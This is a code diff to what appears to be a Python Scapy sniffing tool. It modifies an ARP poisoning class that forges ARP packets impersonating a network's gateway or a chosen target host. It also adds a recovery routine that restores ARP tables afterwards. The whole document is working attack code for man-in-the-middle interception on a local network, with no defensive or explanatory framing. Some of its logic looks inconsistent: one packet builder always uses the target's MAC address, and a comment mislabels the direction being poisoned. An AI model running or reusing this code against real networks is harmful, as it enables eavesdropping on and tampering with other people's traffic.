@@ -19,7 +19,6 @@ class arp_poison:
         if res:
             for s, r in res.res:
                 mac_res = r.src
-        print mac_res
         if mac_res is '':
             raise Exception('can not find ip: ' + str(ip) + ' mac ')
         return mac_res
@@ -36,18 +35,32 @@ class arp_poison:
         self.local_ip_addr = get_if_addr(MySniffConf.iface)
         if MySniffConf.gateway is '':
             MySniffConf.gateway = self.get_gateway()
+        self.gateway_ip_addr = MySniffConf.gateway
+        self.gateway_mac_adr = self.get_mac(self.gateway_ip_addr)
+        self.target_ip_addr=MySniffConf.ARPSpoofAddr
+        self.target_mac_addr = self.get_mac(self.target_ip_addr)
 
     def poison(self):
         # posion -> target
-        task(self.build_pkg(MySniffConf.ARPSpoofAddr, MySniffConf.gateway)).start()
+        # task(self.build_pkg(MySniffConf.ARPSpoofAddr, MySniffConf.gateway)).start()
 
-        # posion -> gateway
+        # posion -> target
         task(self.build_pkg(MySniffConf.gateway, MySniffConf.ARPSpoofAddr)).start()
 
-    def build_pkg(self, src_ip, target_ip):
-        target_mac = self.get_mac(target_ip)
-        return Ether(dst=target_mac) / ARP(op="who-has", psrc=src_ip, pdst=target_ip)
+    def recovery(self):
+        for i in xrange(5):
+            pkg = Ether(dst='ff:ff:ff:ff:ff:ff') / \
+                ARP(op=2, psrc=self.gateway_ip_addr,hwsrc=self.gateway_mac_adr)
+            sendp(pkg,verbose=0)
 
+            pkg = Ether(dst='ff:ff:ff:ff:ff:ff') / \
+                ARP(op=2, psrc=self.target_ip_addr,hwsrc=self.target_mac_addr)
+            sendp(pkg,verbose=0)
+        pass
+
+    def build_pkg(self, src_ip, target_ip):
+        target_mac = self.target_mac_addr
+        return Ether(dst=target_mac) / ARP(op="who-has", psrc=src_ip, pdst=target_ip)
     pass
 
 
